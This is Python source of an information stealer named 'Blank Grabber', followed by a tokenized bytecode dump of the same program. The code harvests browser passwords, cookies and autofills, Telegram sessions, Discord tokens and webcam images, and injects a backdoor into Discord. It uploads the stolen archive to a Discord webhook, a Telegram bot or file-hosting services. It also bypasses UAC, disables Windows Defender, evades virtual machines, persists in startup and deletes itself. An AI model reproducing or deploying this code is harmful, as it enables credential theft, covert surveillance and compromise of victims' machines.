                  threads: list[Thread] = []
                  paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(
                      os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
                  for name, item in paths.items():
                      path, procname = item
                      if os.path.isdir(path):

                          def run(name, path):
                              try:
                                  Utility.TaskKill(procname)
                                  browser = Browsers.Chromium(path)
                                  saveToDir = os.path.join(
                                      self.TempFolder, 'Credentials', name)
                                  passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                                  cookies = browser.GetCookies() if Settings.CaptureCookies else None
                                  history = browser.GetHistory() if Settings.CaptureHistory else None
                                  autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
                                  if passwords or cookies or history or autofills:
                                      os.makedirs(saveToDir, exist_ok=True)
                                      if passwords:
                                          output = ['URL: {}\nUsername: {}\nPassword: {}'.format(
                                              *x) for x in passwords]
                                          with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                              file.write(self.Separator.lstrip(
                                              ) + self.Separator.join(output))
                                          self.PasswordsCount += len(passwords)
                                      if cookies:
                                          output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(
                                              not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                          with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                              file.write('\n'.join(output))
                                          self.Cookies.extend(
                                              [str(x[3]) for x in cookies])
                                      if history:
                                          output = ['URL: {}\nTitle: {}\nVisits: {}'.format(
                                              *x) for x in history]
                                          with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                              file.write(self.Separator.lstrip(
                                              ) + self.Separator.join(output))
                                          self.HistoryCount += len(history)
                                      if autofills:
                                          output = '\n'.join(autofills)
                                          with open(os.path.join(saveToDir, '{} Autofills.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                              file.write(output)
                                          self.AutofillCount += len(autofills)
                              except Exception:
                                  pass
                          t = Thread(target=run, args=(name, path))
                          t.start()
                          threads.append(t)
                  for thread in threads:
                      thread.join()
                  if Settings.CaptureGames:
                      self.StealRobloxCookies()

              @Errors.Catch
              def Webshot(self) -> None:
                  if Settings.CaptureWebcam:
                      camdir = os.path.join(self.TempFolder, 'Webcam')
                      os.makedirs(camdir, exist_ok=True)
                      camIndex = 0
                      while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
                          camIndex += 1
                          self.WebcamPicturesCount += 1
                      if self.WebcamPicturesCount == 0:
                          shutil.rmtree(camdir)

              @Errors.Catch
              def StealTelegramSessions(self) -> None:
                  if Settings.CaptureTelegram:
                      Logger.info('Stealing telegram sessions')
                      telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v)
                                                                          for v in Utility.GetLnkFromStartMenu('Telegram')] if x is not None])]
                      multiple = len(telegramPaths) > 1
                      saveToDir = os.path.join(
                          self.TempFolder, 'Messenger', 'Telegram')
                      if not telegramPaths:
                          telegramPaths.append(os.path.join(
                              os.getenv('appdata'), 'Telegram Desktop'))
                      for index, telegramPath in enumerate(telegramPaths):
                          tDataPath = os.path.join(telegramPath, 'tdata')
                          loginPaths = []
                          files = []
                          dirs = []
                          has_key_datas = False
                          if os.path.isdir(tDataPath):
                              for item in os.listdir(tDataPath):
                                  itempath = os.path.join(tDataPath, item)
                                  if item == 'key_datas':
                                      has_key_datas = True
                                      loginPaths.append(itempath)
                                  if os.path.isfile(itempath):
                                      files.append(item)
                                  else:
                                      dirs.append(item)
                              for filename in files:
                                  for dirname in dirs:
                                      if dirname + 's' == filename:
                                          loginPaths.extend(
                                              [os.path.join(tDataPath, x) for x in (filename, dirname)])
                          if has_key_datas and len(loginPaths) - 1 > 0:
                              _saveToDir = saveToDir
                              if multiple:
                                  _saveToDir = os.path.join(
                                      _saveToDir, 'Profile %d' % (index + 1))
                              os.makedirs(_saveToDir, exist_ok=True)
                              failed = False
                              for loginPath in loginPaths:
                                  try:
                                      if os.path.isfile(loginPath):
                                          shutil.copy(loginPath, os.path.join(
                                              _saveToDir, os.path.basename(loginPath)))
                                      else:
                                          shutil.copytree(loginPath, os.path.join(
                                              _saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                                  except Exception:
                                      shutil.rmtree(_saveToDir)
                                      failed = True
                                      break
                              if not failed:
                                  self.TelegramSessionsCount += int(
                                      (len(loginPaths) - 1) / 2)
                      if self.TelegramSessionsCount and multiple:
                          with open(os.path.join(saveToDir, 'Info.txt'), 'w') as file:
                              file.write(
                                  'Multiple Telegram installations are found, so the files for each of them are put in different Profiles')

              @Errors.Catch
              def StealDiscordTokens(self) -> None:
                  if Settings.CaptureDiscordTokens:
                      Logger.info('Stealing discord tokens')
                      output = list()
                      saveToDir = os.path.join(
                          self.TempFolder, 'Messenger', 'Discord')
                      accounts = Discord.GetTokens()
                      if accounts:
                          for item in accounts:
                              USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                              output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(
                                  USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                          os.makedirs(os.path.join(self.TempFolder,
                                      'Messenger', 'Discord'), exist_ok=True)
                          with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                              file.write(self.Separator.lstrip() +
                                         self.Separator.join(output))
                          self.DiscordTokensCount += len(accounts)
                  if Settings.DiscordInjection and (not Utility.IsInStartup()):
                      paths = Discord.InjectJs()
                      if paths is not None:
                          Logger.info('Injecting backdoor into discord')
                          for dir in paths:
                              appname = os.path.basename(dir)
                              Utility.TaskKill(appname)
                              for root, _, files in os.walk(dir):
                                  for file in files:
                                      if file.lower() == appname.lower() + '.exe':
                                          time.sleep(3)
                                          filepath = os.path.dirname(
                                              os.path.realpath(os.path.join(root, file)))
                                          UpdateEXE = os.path.join(dir, 'Update.exe')
                                          DiscordEXE = os.path.join(
                                              filepath, '{}.exe'.format(appname))
                                          subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True,
                                                           creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

              def CreateArchive(self) -> tuple[str, str]:
                  Logger.info('Creating archive')
                  rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
                  if Utility.GetSelf()[1] or os.path.isfile(rarPath):
                      rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
                      if os.path.isfile(rarPath):
                          password = Settings.ArchivePassword or 'blank123'
                          process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(
                              rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                          if process.returncode == 0:
                              return 'rar'
                  shutil.make_archive(self.ArchivePath.rsplit('.', 1)
                                      [0], 'zip', self.TempFolder)
                  return 'zip'

              def UploadToExternalService(self, path, filename=None) -> str | None:
                  if os.path.isfile(path):
                      Logger.info('Uploading %s to gofile' % (filename or 'file'))
                      with open(path, 'rb') as file:
                          fileBytes = file.read()
                      if filename is None:
                          filename = os.path.basename(path)
                      http = PoolManager(cert_reqs='CERT_NONE')
                      try:
                          server = json.loads(http.request(
                              'GET', 'https://api.gofile.io/getServer').data.decode(errors='ignore'))['data']['server']
                          if server:
                              url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={
                                  'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
                              if url:
                                  return url
                      except Exception:
                          try:
                              Logger.error(
                                  'Failed to upload to gofile, trying to upload to anonfiles')
                              url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (
                                  filename, fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
                              return url
                          except Exception:
                              Logger.error('Failed to upload to anonfiles')
                              return None

              def SendData(self) -> None:
                  Logger.info('Sending data to C2')
                  extention = self.CreateArchive()
                  if not os.path.isfile(self.ArchivePath):
                      raise FileNotFoundError('Failed to create archive')
                  filename = 'Blank-%s.%s' % (os.getlogin(), extention)
                  computerName = os.getenv(
                      'computername') or 'Unable to get computer name'
                  computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(
                      errors='ignore').strip().splitlines()
                  computerOS = computerOS[2].strip() if len(
                      computerOS) >= 2 else 'Unable to detect OS'
                  totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory',
                                               capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
                  totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(
                      totalMemory) >= 1 else 'Unable to detect total memory'
                  uuid = subprocess.run('wmic csproduct get uuid', capture_output=True,
                                        shell=True).stdout.decode(errors='ignore').strip().split()
                  uuid = uuid[1].strip() if len(
                      uuid) >= 1 else 'Unable to detect UUID'
                  cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER",
                                       capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
                  gpu = subprocess.run('wmic path win32_VideoController get name',
                                       capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
                  gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
                  productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
                                              capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
                  http = PoolManager(cert_reqs='CERT_NONE')
                  try:
                      r: dict = json.loads(http.request(
                          'GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
                      if r.get('status') != 'success':
                          raise Exception('Failed')
                      data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
                      if len(r['reverse']) != 0:
                          data += f"\nReverse DNS: {r['reverse']}"
                  except Exception:
                      ipinfo = '(Unable to get IP info)'
                  else:
                      ipinfo = data
                  system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
                  collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount,
                                'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
                  grabbedInfo = '\n'.join([key + ' : ' + str(value)
                                          for key, value in collection.items()])
                  match Settings.C2[0]:
                      case 0:
                          image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
                          payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**',
                                                                                                        'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                          if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                              url = self.UploadToExternalService(
                                  self.ArchivePath, filename)
                              if url is None:
                                  raise Exception(
                                      'Failed to upload to external service')
                          else:
                              url = None
                          fields = dict()
                          if url:
                              payload['content'] += ' | Archive : %s' % url
                          else:
                              fields['file'] = (filename, open(
                                  self.ArchivePath, 'rb').read())
                          fields['payload_json'] = json.dumps(payload).encode()
                          http.request('POST', Settings.C2[1], fields=fields)
                      case 1:
                          payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                          if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                              url = self.UploadToExternalService(
                                  self.ArchivePath, filename)
                              if url is None:
                                  raise Exception(
                                      'Failed to upload to external service')
                          else:
                              url = None
                          fields = dict()
                          if url:
                              payload['text'] = payload['caption'] + \
                                  '\n\nArchive : %s' % url
                              method = 'sendMessage'
                          else:
                              fields['document'] = (filename, open(
                                  self.ArchivePath, 'rb').read())
                              method = 'sendDocument'
                          token, chat_id = Settings.C2[1].split('$')
                          fields.update(payload)
                          fields.update({'chat_id': chat_id})
                          http.request('POST', 'https://api.telegram.org/bot%s/%s' %
                                       (token, method), fields=fields)

          if os.name == 'nt':
              Logger.info('Process started')
              if Settings.HideConsole:
                  Syscalls.HideConsole()
              if not Utility.IsAdmin():
                  Logger.warning('Admin privileges not available')
                  if Utility.GetSelf()[1]:
                      if not '--nouacbypass' in sys.argv and Settings.UacBypass:
                          Logger.info(
                              'Trying to bypass UAC (Application will restart)')
                          if Utility.UACbypass():
                              os._exit(0)
                          else:
                              Logger.warning('Failed to bypass UAC')
                              if not Utility.IsInStartup(sys.executable):
                                  logger.info('Showing UAC prompt')
                                  if Utility.UACPrompt(sys.executable):
                                      os._exit(0)
                      if not Utility.IsInStartup() and (not Settings.UacBypass):
                          Logger.info(
                              'Showing UAC prompt to user (Application will restart)')
                          if Utility.UACPrompt(sys.executable):
                              os._exit(0)
              Logger.info('Trying to create mutex')
              if not Syscalls.CreateMutex(Settings.Mutex):
                  Logger.info('Mutex already exists, exiting')
                  os._exit(0)
              if Utility.GetSelf()[1]:
                  Logger.info('Trying to exclude the file from Windows defender')
                  Utility.ExcludeFromDefender()
              Logger.info('Trying to disable defender')
              Utility.DisableDefender()
              if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):
                  try:
                      Logger.info('Trying to extract bound file')
                      if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
                          Logger.info('Old bound file found, removing it')
                          os.remove(boundFileDst)
                      with open(boundFileSrc, 'rb') as file:
                          content = file.read()
                      decrypted = zlib.decompress(content[::-1])
                      with open(boundFileDst, 'wb') as file:
                          file.write(decrypted)
                      del content, decrypted
                      Logger.info('Trying to exclude bound file from defender')
                      Utility.ExcludeFromDefender(boundFileDst)
                      Logger.info('Starting bound file')
                      subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(
                          boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
                  except Exception as e:
                      Logger.error(e)
              if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
                  try:
                      Logger.info('Showing fake error popup')
                      title = Settings.FakeError[1][0].replace(
                          '"', '\\x22').replace("'", '\\x22')
                      message = Settings.FakeError[1][1].replace(
                          '"', '\\x22').replace("'", '\\x22')
                      icon = int(Settings.FakeError[1][2])
                      cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(
                          message, title, Settings.FakeError[1][2])
                      subprocess.Popen(
                          cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
                  except Exception as e:
                      Logger.error(e)
              if not Settings.Vmprotect or not VmProtect.isVM():
                  if Utility.GetSelf()[1]:
                      if Settings.Melt and (not Utility.IsInStartup()):
                          Logger.info('Hiding the file')
                          Utility.HideSelf()
                  elif Settings.Melt:
                      Logger.info('Deleting the file')
                      Utility.DeleteSelf()
                  try:
                      if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                          Logger.info('Trying to put the file in startup')
                          path = Utility.PutInStartup()
                          if path is not None:
                              Logger.info(
                                  'Excluding the file from Windows defender in startup')
                              Utility.ExcludeFromDefender(path)
                  except Exception:
                      Logger.error('Failed to put the file in startup')
                  while True:
                      try:
                          Logger.info('Checking internet connection')
                          if Utility.IsConnectedToInternet():
                              Logger.info(
                                  'Internet connection available, starting stealer (things will be running in parallel)')
                              BlankGrabber()
                              Logger.info('Stealer finished its work')
                              break
                          else:
                              Logger.info(
                                  'Internet connection not found, retrying in 10 seconds')
                              time.sleep(10)
                      except Exception as e:
                          if isinstance(e, KeyboardInterrupt):
                              os._exit(1)
                          Logger.critical(e, exc_info=True)
                          Logger.info(
                              'There was an error, retrying after 10 minutes')
                          time.sleep(600)
                  if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
                      Logger.info('Deleting the file')
                      Utility.DeleteSelf()
                  Logger.info('Process ended')
    tokens: TARGETED_FILE make_cell Browsers make_cell Discord make_cell Errors make_cell HTTPResponse make_cell Logger make_cell PoolManager make_cell Settings make_cell Syscalls make_cell Tasks make_cell Thread make_cell Utility make_cell VmProtect make_cell base64 make_cell ctypes make_cell json make_cell os make_cell pyaes make_cell random make_cell re make_cell shutil make_cell sqlite3 make_cell subprocess make_cell sys make_cell time make_cell traceback make_cell wintypes resume load_const INTEGER load_const import_name os store_deref os load_const INTEGER load_const import_name sys store_deref sys load_const INTEGER load_const import_name base64 store_deref base64 load_const INTEGER load_const import_name subprocess store_deref subprocess load_deref subprocess load_attr check_call load_deref sys load_attr executable load_const -m load_const pip load_const install load_const urllib3 load_const pyaes build_list call pop_top load_const INTEGER load_const import_name json store_deref json load_const INTEGER load_const import_name pyaes store_deref pyaes load_const INTEGER load_const import_name random store_deref random load_const INTEGER load_const import_name shutil store_deref shutil load_const INTEGER load_const import_name sqlite3 store_deref sqlite3 load_const INTEGER load_const import_name re store_deref re load_const INTEGER load_const import_name traceback store_deref traceback load_const INTEGER load_const import_name time store_deref time load_const INTEGER load_const import_name ctypes store_deref ctypes load_const INTEGER load_const import_name logging store_fast logging load_const INTEGER load_const import_name zlib store_fast zlib load_const INTEGER load_const import_name threading import_from Thread store_deref Thread pop_top load_const INTEGER load_const import_name ctypes import_from wintypes store_deref wintypes pop_top load_const INTEGER load_const import_name urllib3 import_from PoolManager store_deref PoolManager import_from HTTPResponse store_deref HTTPResponse import_from STRING_LEN_S_ENT_HIGH store_fast STRING_LEN_S_ENT_HIGH pop_top push_null load_fast STRING_LEN_S_ENT_HIGH call pop_top push_null load_build_class load_closure base64 build_tuple load_const OBJECT make_function closure load_const Settings call store_deref Settings load_global REFLECTION_DYNAMIC_READ load_deref sys load_const _MEIPASS call pop_jump_if_true TO_NUMBER load_deref os load_attr path load_attr dirname load_deref os load_attr path load_attr abspath load_global __file__ call call load_deref sys store_attr _MEIPASS load_deref ctypes load_attr windll load_attr kernel32 load_attr SetConsoleMode load_deref ctypes load_attr windll load_attr kernel32 load_attr GetStdHandle load_const INTEGER call load_const INTEGER call pop_top load_fast logging load_attr basicConfig load_const STRING_LEN_S_ENT_HIGH kw_names format call pop_top load_fast logging load_attr root load_attr manager load_attr loggerDict load_attr items call get_iter for_iter TO_NUMBER unpack_sequence store_fast _ store_fast logger load_const INTEGER load_fast logger store_attr disabled jump_backward TO_NUMBER end_for load_fast logging load_attr getLogger load_const Blank Grabber call store_deref Logger load_deref Logger load_attr setLevel load_fast logging load_attr INFO call pop_top load_deref Settings load_attr Debug pop_jump_if_true TO_NUMBER load_const INTEGER load_deref Logger store_attr disabled push_null load_build_class load_closure Logger load_closure PoolManager load_closure Thread load_closure Utility load_closure VmProtect load_closure os load_closure subprocess build_tuple load_const OBJECT make_function closure load_const VmProtect call store_deref VmProtect push_null load_build_class load_closure Errors load_closure Logger load_closure Utility load_closure os load_closure traceback build_tuple load_const OBJECT make_function closure load_const Errors call store_deref Errors push_null load_build_class load_closure Tasks load_closure Thread build_tuple load_const OBJECT make_function closure load_const Tasks call store_deref Tasks push_null load_build_class load_closure ctypes load_closure wintypes build_tuple load_const OBJECT make_function closure load_const Syscalls call store_deref Syscalls push_null load_build_class load_closure PoolManager load_closure Utility load_closure base64 load_closure ctypes load_closure os load_closure random load_closure shutil load_closure subprocess load_closure sys build_tuple load_const OBJECT make_function closure load_const Utility call store_deref Utility push_null load_build_class load_closure Syscalls load_closure Utility load_closure base64 load_closure json load_closure os load_closure pyaes load_closure shutil load_closure sqlite3 build_tuple load_const OBJECT make_function closure load_const Browsers call store_deref Browsers push_null load_build_class load_closure Discord load_closure HTTPResponse load_closure PoolManager load_closure Settings load_closure Syscalls load_closure Thread load_closure base64 load_closure json load_closure os load_closure pyaes load_closure re build_tuple load_const OBJECT make_function closure load_const Discord call store_deref Discord push_null load_build_class load_closure Browsers load_closure Discord load_closure Errors load_closure Logger load_closure PoolManager load_closure Settings load_closure Syscalls load_closure Tasks load_closure Thread load_closure Utility load_closure json load_closure os load_closure re load_closure shutil load_closure subprocess load_closure sys load_closure time build_tuple load_const OBJECT make_function closure load_const BlankGrabber call store_fast BlankGrabber load_deref os load_attr name load_const nt compare_op == extended_arg pop_jump_if_false TO_NUMBER load_deref Logger load_attr info load_const Process started call pop_top load_deref Settings load_attr HideConsole pop_jump_if_false TO_NUMBER load_deref Syscalls load_attr HideConsole call pop_top load_deref Utility load_attr IsAdmin call extended_arg pop_jump_if_true TO_NUMBER load_deref Logger load_attr warning load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr GetSelf call load_const INTEGER binary_subscr extended_arg pop_jump_if_false TO_NUMBER load_const --nouacbypass load_deref sys load_attr argv contains_op pop_jump_if_false TO_NUMBER load_deref Settings load_attr UacBypass pop_jump_if_false TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr UACbypass call pop_jump_if_false TO_NUMBER load_deref os load_attr _exit load_const INTEGER call pop_top jump_forward TO_NUMBER load_deref Logger load_attr warning load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr IsInStartup load_deref sys load_attr executable call pop_jump_if_true TO_NUMBER load_fast_check logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr UACPrompt load_deref sys load_attr executable call pop_jump_if_false TO_NUMBER load_deref os load_attr _exit load_const INTEGER call pop_top load_deref Utility load_attr IsInStartup call pop_jump_if_true TO_NUMBER load_deref Settings load_attr UacBypass pop_jump_if_true TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr UACPrompt load_deref sys load_attr executable call pop_jump_if_false TO_NUMBER load_deref os load_attr _exit load_const INTEGER call pop_top load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Syscalls load_attr CreateMutex load_deref Settings load_attr Mutex call pop_jump_if_true TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref os load_attr _exit load_const INTEGER call pop_top load_deref Utility load_attr GetSelf call load_const INTEGER binary_subscr pop_jump_if_false TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr STRING_LEN_S_ENT_HIGH call pop_top load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr DisableDefender call pop_top load_deref Utility load_attr GetSelf call load_const INTEGER binary_subscr extended_arg pop_jump_if_false TO_NUMBER load_deref Settings load_attr STRING_LEN_S_ENT_HIGH pop_jump_if_true TO_NUMBER load_deref Utility load_attr IsInStartup call extended_arg pop_jump_if_true TO_NUMBER load_deref os load_attr path load_attr isfile load_deref os load_attr path load_attr join load_deref sys load_attr _MEIPASS load_const bound.blank call copy store_fast boundFileSrc call extended_arg pop_jump_if_false TO_NUMBER nop load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref os load_attr path load_attr isfile load_deref os load_attr path load_attr join load_deref os load_attr getenv load_const temp call load_const bound.exe call copy store_fast boundFileDst call pop_jump_if_false TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref os load_attr remove load_fast boundFileDst call pop_top load_global FILESYSTEM_ACCESS load_fast boundFileSrc load_const rb call before_with store_fast file load_fast file load_attr read call store_fast content load_const load_const load_const call pop_top load_fast zlib load_attr ARCHIVE_COMPRESSION load_fast_check content load_const load_const load_const INTEGER build_slice binary_subscr call store_fast decrypted load_global FILESYSTEM_ACCESS load_fast boundFileDst load_const wb call before_with store_fast file load_fast file load_attr write load_fast decrypted call pop_top load_const load_const load_const call pop_top delete_fast content delete_fast decrypted load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr STRING_LEN_S_ENT_HIGH load_fast boundFileDst call pop_top load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref subprocess load_attr Popen load_const start bound.exe load_const INTEGER load_deref os load_attr path load_attr dirname load_fast boundFileDst call load_deref subprocess load_attr STRING_LEN_S_ENT_HIGH load_deref subprocess load_attr SW_HIDE binary_op | kw_names creationflags cwd shell call pop_top load_deref Utility load_attr GetSelf call load_const INTEGER binary_subscr pop_jump_if_false TO_NUMBER load_deref Settings load_attr FakeError load_const INTEGER binary_subscr pop_jump_if_false TO_NUMBER load_deref Utility load_attr IsInStartup call pop_jump_if_true TO_NUMBER nop load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Settings load_attr FakeError load_const INTEGER binary_subscr load_const INTEGER binary_subscr load_attr replace load_const " load_const STRING_FILE_PATH call load_attr replace load_const ' load_const STRING_FILE_PATH call store_fast title load_deref Settings load_attr FakeError load_const INTEGER binary_subscr load_const INTEGER binary_subscr load_attr replace load_const " load_const STRING_FILE_PATH call load_attr replace load_const ' load_const STRING_FILE_PATH call store_fast message load_global int load_deref Settings load_attr FakeError load_const INTEGER binary_subscr load_const INTEGER binary_subscr call store_fast icon load_const STRING_LEN_S_ENT_VHIGH load_attr format load_fast message load_fast title load_deref Settings load_attr FakeError load_const INTEGER binary_subscr load_const INTEGER binary_subscr call store_fast cmd load_deref subprocess load_attr Popen load_fast cmd load_const INTEGER load_deref subprocess load_attr STRING_LEN_S_ENT_HIGH load_deref subprocess load_attr SW_HIDE binary_op | kw_names creationflags shell call pop_top load_deref Settings load_attr Vmprotect pop_jump_if_false TO_NUMBER load_deref VmProtect load_attr isVM call extended_arg pop_jump_if_true TO_NUMBER load_deref Utility load_attr GetSelf call load_const INTEGER binary_subscr pop_jump_if_false TO_NUMBER load_deref Settings load_attr Melt pop_jump_if_false TO_NUMBER load_deref Utility load_attr IsInStartup call pop_jump_if_true TO_NUMBER load_deref Logger load_attr info load_const Hiding the file call pop_top load_deref Utility load_attr HideSelf call pop_top jump_forward TO_NUMBER load_deref Settings load_attr Melt pop_jump_if_false TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr DeleteSelf call pop_top nop load_deref Utility load_attr GetSelf call load_const INTEGER binary_subscr pop_jump_if_false TO_NUMBER load_deref Settings load_attr Startup pop_jump_if_false TO_NUMBER load_deref Utility load_attr IsInStartup call pop_jump_if_true TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr PutInStartup call store_fast path load_fast path pop_jump_if_none TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call 